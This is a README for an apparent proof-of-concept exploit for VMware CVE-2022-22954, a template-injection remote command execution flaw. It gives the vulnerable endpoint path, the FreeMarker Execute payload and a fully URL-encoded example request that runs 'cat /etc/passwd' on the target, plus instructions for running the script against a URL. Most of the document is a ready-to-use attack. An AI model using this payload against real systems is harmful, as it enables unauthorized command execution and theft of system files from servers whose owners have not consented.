# VMware-CVE-2022-22954-Command-Injector

Proof of Concept for exploiting VMware CVE-2022-22954

## How it works

This simple Python script makes a GET request to the specified URL appended with `/catalog-portal/ui/oauth/verify?error=&deviceUdid=` and then followed by a URL encoded version of this string:

```js
${"freemarker.template.utility.Execute"?new()("command")}
```

For example, an output for "cat /etc/passwd" would look like the following:
`{host}/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d`

## Instructions

 ```bash
 python3 exploit.py <URL>
 ```

## References
 - https://github.com/sherlocksecurity/VMware-CVE-2022-22954
